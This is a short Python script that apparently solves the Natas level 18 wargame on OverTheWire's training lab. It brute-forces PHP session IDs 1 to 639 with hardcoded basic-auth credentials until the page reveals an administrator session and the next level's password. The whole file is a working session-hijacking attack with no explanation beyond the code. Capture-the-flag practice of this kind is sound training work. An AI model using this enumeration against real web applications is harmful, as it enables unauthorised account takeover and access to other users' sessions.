import requests
from requests.auth import HTTPBasicAuth
import string

auth = HTTPBasicAuth('natas18','8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')

headers = {'Content-Type': 'application/x-www-form-urlencoded'}


for i in range(1, 640):
    print(i)
    cookie = {'PHPSESSID': str(i)}
    r = requests.get('http://natas18.natas.labs.overthewire.org/index.php?debug', cookies=cookie,auth=auth)

    if 'next level' in r.text:
        print("PHPSESSID: " + str(i) + " \n " + r.text)
        break


